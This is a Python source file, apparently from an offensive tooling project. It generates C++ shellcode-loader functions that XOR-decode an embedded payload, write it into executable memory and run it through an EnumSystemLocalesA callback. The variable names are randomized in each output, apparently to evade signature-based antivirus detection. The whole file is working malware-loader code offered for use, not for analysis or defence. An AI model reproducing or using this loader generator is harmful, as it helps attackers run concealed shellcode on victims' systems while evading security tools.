from modules.namegen import generate_random_name

def generate_dll_template(function_name, xor_function, xor_var, shellcode_var, shellcode_len_var, create_thread, virtual_protect, write_vm, virtual_alloc):

    exe_template = """
void REPLACE_WITH_FUNCTION_NAME() {

    PVOID REPLACE_W_VAR1 = nullptr;
    HANDLE REPLACE_W_VAR2 = GetCurrentProcess();
    ULONG old;


    REPLACE_WITH_XOR_FUNCTION_NAME((char*)REPLACE_WITH_SHELLCODE_VAR, REPLACE_WITH_SHELLCODE_LEN_VAR, REPLACE_WITH_KEY_VAR, sizeof(REPLACE_WITH_KEY_VAR));
    SIZE_T REPLACE_W_VAR3 = sizeof(REPLACE_WITH_SHELLCODE_VAR);
    
    REPLACE_WITH_VIRTUAL_ALLOC(REPLACE_W_VAR2, &REPLACE_W_VAR1, 0, &REPLACE_W_VAR3, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
    
    REPLACE_WITH_WRITE_VM(REPLACE_W_VAR2, REPLACE_W_VAR1, REPLACE_WITH_SHELLCODE_VAR, REPLACE_W_VAR3, nullptr);
    
    REPLACE_WITH_VIRTUAL_PROTECT(REPLACE_W_VAR2, &REPLACE_W_VAR1, &REPLACE_W_VAR3, PAGE_EXECUTE_READ, &old);
    
    EnumSystemLocalesA((LOCALE_ENUMPROCA)REPLACE_W_VAR1, 0);

}

"""

    exe_template = exe_template.replace("REPLACE_WITH_CREATE_THREAD", create_thread)
    exe_template = exe_template.replace("REPLACE_WITH_VIRTUAL_PROTECT", virtual_protect)
    exe_template = exe_template.replace("REPLACE_WITH_WRITE_VM", write_vm)
    exe_template = exe_template.replace("REPLACE_WITH_XOR_FUNCTION_NAME", xor_function)
    exe_template = exe_template.replace("REPLACE_WITH_SHELLCODE_VAR", shellcode_var)
    exe_template = exe_template.replace("REPLACE_WITH_SHELLCODE_LEN_VAR", shellcode_len_var)
    exe_template = exe_template.replace("REPLACE_WITH_KEY_VAR", xor_var)
    exe_template = exe_template.replace("REPLACE_WITH_FUNCTION_NAME", function_name)
    exe_template = exe_template.replace("REPLACE_WITH_VIRTUAL_ALLOC", virtual_alloc)



    exe_template = exe_template.replace("REPLACE_W_VAR1", generate_random_name())
    exe_template = exe_template.replace("REPLACE_W_VAR2", generate_random_name())
    exe_template = exe_template.replace("REPLACE_W_VAR3", generate_random_name())
    exe_template = exe_template.replace("REPLACE_W_VAR4", generate_random_name())


    return exe_template